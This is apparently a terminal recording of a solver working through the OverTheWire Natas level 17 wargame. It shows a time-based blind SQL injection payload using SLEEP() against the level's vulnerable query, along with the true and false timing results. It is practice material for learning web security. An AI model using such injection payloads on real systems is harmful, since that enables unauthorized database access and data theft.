[0.002, "o", "$ curl -s -u natas17:<pw> http://natas17.natas.labs.overthewire.org/index-source.html\r\n$   source: SELECT * from users where username=\"\".$_REQUEST[\"username\"].\"\"  (double quotes)\r\n$   the result is not echoed -> blind. Use a timing oracle: OR IF(<cond>,SLEEP(5),0)-- -\r\n"]
[0.433, "o", "SELECT * from users where username=\\\"\".$_REQUEST[\"username\"].\"\\\"\"\r\n"]
[0.000, "o", "$ oracle: the WHERE clause returns ~4 rows, so SLEEP(5) fires once per row\r\n$   -> a true condition takes ~20 s, a false one ~0.5 s\r\n"]
[20.416, "o", "  20.4 s\r\n"]
[0.584, "o", "  0.6 s\r\n"]
